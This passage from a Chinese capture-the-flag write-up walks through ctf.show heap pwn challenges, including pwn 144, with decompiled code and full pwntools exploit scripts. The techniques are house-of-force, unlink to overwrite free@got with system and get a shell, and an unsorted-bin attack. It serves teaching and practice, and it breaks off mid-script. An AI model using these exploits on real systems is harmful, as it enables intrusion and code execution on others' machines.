class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28173</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,name</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,name</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        io.revcuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">        io.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = elf.sym[<span class="string">&#x27;fffffffffffffffffffffffffffffffffflag&#x27;</span>]</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="number">0x30</span> * <span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line"></span><br><span class="line">offset = -(<span class="number">0x60</span>+<span class="number">0x8</span>+<span class="number">0xf</span>)</span><br><span class="line">add(offset,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(flag) * <span class="number">2</span>)</span><br><span class="line">get_flag()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>还可以使用<strong>Unlink</strong>进行攻击</p>
<p>利用思路</p>
<ol>
<li>伪造一个空闲 chunk。</li>
<li>通过 unlink 把 chunk 移到存储 chunk 指针的内存处。</li>
<li>覆盖 chunk 0 指针为 free@got 表地址并泄露。</li>
<li>覆盖 free@got 表为 system 函数地址。</li>
<li>申请chunk的内容为“&#x2F;bin&#x2F;sh”，调用 free 函数进行get shell。</li>
</ol>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28173</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,context</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the length:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the name:&quot;</span>)</span><br><span class="line">        io.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,length,context</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the index:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the length of name:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the new name:&quot;</span>)</span><br><span class="line">        io.send(context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Please enter the index:&quot;</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">        io.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020a8</span></span><br><span class="line">fd = ptr-<span class="number">0x18</span></span><br><span class="line">bk = ptr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">fake_chunk  = p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x41</span>)</span><br><span class="line">fake_chunk += p64(fd)</span><br><span class="line">fake_chunk += p64(bk)</span><br><span class="line">fake_chunk += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">fake_chunk += p64(<span class="number">0x40</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(fake_chunk),fake_chunk)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;free_got:%x&quot;</span>,<span class="built_in">hex</span>(free_got))</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>) + p64(free_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(fake_chunk),payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">free = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) </span><br><span class="line">log.info(<span class="string">&quot;free addr is:%x&quot;</span>,free)</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>,free)</span><br><span class="line">libc_base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="pwn-144"><a href="#pwn-144" class="headerlink" title="pwn 144"></a>pwn 144</h1><p>检查保护：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=NzY5NjQwZDc1ZDEzNTJlNGU5ZTQwZTcyZjlmZTc2ZDhfSUhnQTlMOG1rVTMzZEFhenQyMFFFcFd2d1dOQXVya3BfVG9rZW46UEE1VGJiaVc4b3g2TzZ4aXVCa2NyWDRCbkZnXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>64位程序，开启了Canary和NX,部分开启RELRO</p>
<p>IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">114514</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">114514</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          TaT();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一眼看到114514，然后可以看到TaT是一个后门函数：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGU1MWNhOTdkY2RjN2QzYWI1MThkYWUyMDNiZTc3ZjRfUnc3elRsZ2FBM1d1dzAzYjRhYWE4ekhyU2FyR1Y1Y2FfVG9rZW46RzBib2J1RkxmbzNYT3d4a3hieGN4aTVmbk9lXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>magic 为在 bss 段的全局变量，如果我们能够控制 v3 为 114514 并且覆写 magic 使其值大于 114514 ，就能get flag。</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTg4ODdkNWJlYjQzZjRkN2ViNDVlOGE2OGNhMTA4NzRfNDRXZnZuZDNKVjE2WjA2NnZYRWdZTmhMU3ZlN3dGV0NfVG9rZW46VFRPSGJUQ3Vkb05LYml4aEg0Z2M2SE1sbnpmXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>看菜单menu():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcyZmRmYjYyYWRhYTBkZWJmMzc5OTA4NzRiYmVlZjZfNVVLc1BEdXR1cE1KdFk4Um1wT2hBdHFUeldUNnVtQWVfVG9rZW46Vk9zS2JmUDIxbzRWUWR4MXJ2a2M2YUtvbjBlXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>从菜单来看只有三个功能，没有show,有add(Create) edit(Edit) free(Delete)三个功能，分别跟进对应函数</p>
<p>create_heap()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MmEzNjQxOTE4MDhhZmYzYTY4NDZkZmQxYmEzNGM0ZjVfUGQ4ODVLVE5DNHkxM2I3THBuZXhVcEhSREMzaEhjSDRfVG9rZW46RjNVemJ4WDJkbzhETlZ4TDBoQmMwRHpabk9oXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>heaparray 数组：存放 chunk 的首地址。</p>
<p>read_input(heaparray[i], size)：把我们输入的内容写入 chunk 中。</p>
<p>且heaparray是存放在bss段上</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MmM4NTExZTFjOGIxNWM3Y2NmNzA5OTMxMWFkOGI0N2ZfVmNVRVFVWE5Vbm1reXE0djFsRERUNm1sbUtDUERBSnVfVG9rZW46UUtnbWJ4Sjl4b05hWVl4TFZBa2NKWFV6blJkXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>edit_heap()：</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTRjMDZmNjcwZGEzMWQxMGE4NjJmZGZlYmM5MTg5MWZfdzN3dnZvY2hKOGJTeVdCa0FYbXkyMnFwZXlvVUxhOUFfVG9rZW46WVpqamJ4QXZKb2dUSjJ4M3VHYWNkS0JybmhjXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>可以再次编辑 chunk 的内容，而且可以选择输入大小。如果我们这次输入的 size 比创建时大的话，就会导致堆溢出</p>
<p>【read_input(heaparray[v1], v2)：向 chunk 中写入 v2 大小的内容，也就是说如果 v2 比 create 时的 size 大的话就会造成堆溢出。】</p>
<p>delete_heap():</p>
<p><img src="https://cv2bkr5mufd.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU3ZDhjOTU2ZjFiMjlkN2FhOTAzNDZkNjY2MzVhZjRfekVSaDJhTnFZRnhWczBqVmFSVXF4dHBvTk40S25GYWFfVG9rZW46U3hoZWJLRXJyb0Y4Sm54QmdmRGNUaldlbkpiXzE3NDAyMjk1NTY6MTc0MDIzMzE1Nl9WNA" alt="img"></p>
<p>释放对应 index 的 chunk，并将数组 heaparray 对应的地址置 0。</p>
<p><strong>Unsorted bin Attack</strong></p>
<p>首先通过 unsorted bin attack 覆盖 magic 为一个很大的值，然后然后输入使 v3 等于 114514既可以进入后门函数get flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">idx</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>) <span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x80</span>,<span class="string">&quot;cccc&quot;</span>) <span class="comment"># 2</span></span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">&quot;dddd&quot;</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line">delete_heap(<span class="number">0</span>)</span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">1</span>,<span class="number">0x20</span>+<span class="number">0x20</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(fd) + p64(bk))</span><br><span class="line">create_heap(<span class="number">0x80</span>,<span class="string">&quot;eeee&quot;</span>) </span><br><span class="line">io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;114514&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>unlink攻击：</strong></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">heaparray_0 = <span class="number">0x6020c0</span></span><br><span class="line">heaparray_1 = <span class="number">0x6020c8</span></span><br><span class="line">heaparray_2 = <span class="number">0x6020d0</span></span><br><span class="line">heaparray_3 = <span class="number">0x6020d8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">idx</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&#x27;114514&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x88</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create_heap(<span class="number">0x88</span>,<span class="string">&#x27;bbbbb&#x27;</span>)</span><br><span class="line">create_heap(<span class="number">0x88</span>,<span class="string">&#x27;ccccc&#x27;</span>)</span><br><span class="line">create_heap(<span class="number">0x88</span>,<span class="string">&#x27;ddddd&#x27;</span>)</span><br><span class="line">create_heap(<span class="number">0x88</span>,<span class="string">&#x27;eeeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">fd = heaparray_3 - <span class="number">0x18</span></span><br><span class="line">bk = heaparray_3 - <span class="number">0x10</span></span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0x81</span>) + p64(fd) + p64(bk) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit_heap(<span class="number">3</span>,<span class="number">0x90</span>,payload)                                               </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete_heap(<span class="number">4</span>)                                                              </span><br><span class="line">edit_heap(<span class="number">3</span>,<span class="number">8</span>,p64(magic))</span><br><span class="line">edit_heap(<span 